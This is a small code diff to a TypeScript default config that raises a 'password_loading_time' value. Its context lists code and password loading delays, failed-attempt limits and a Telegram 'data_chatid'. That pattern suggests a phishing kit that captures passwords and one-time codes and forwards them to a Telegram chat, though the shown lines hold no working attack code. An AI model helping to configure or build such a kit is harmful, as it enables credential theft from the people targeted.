@@ -15,7 +15,7 @@ const defaultConfig: Config = {
     code_loading_time: 16000,
     max_failed_code_attempts: 3,
     max_failed_password_attempts: 1,
-    password_loading_time: 12000,
+    password_loading_time: 15000,
   },
   telegram: {
     data_chatid: "-1002416068664",
